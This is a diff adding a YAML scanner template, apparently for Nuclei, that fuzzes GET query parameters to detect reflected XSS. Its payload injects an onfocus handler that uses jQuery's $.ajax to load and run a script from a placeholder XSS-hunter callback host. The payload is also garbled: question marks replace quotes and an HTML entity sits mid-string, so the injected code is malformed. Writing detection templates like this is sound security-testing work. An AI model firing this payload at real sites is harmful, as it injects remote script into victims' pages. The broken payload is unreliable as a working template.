@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-ajax
+
+info:
+  name: Custom Reflection XSS Detection with AJAX
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a specific AJAX payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "= onfocus=$.ajax({url:?http://&#8217;.concat(?yourxsshunder\\.xss.ht?),dataType:?script?,success:?success?})"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
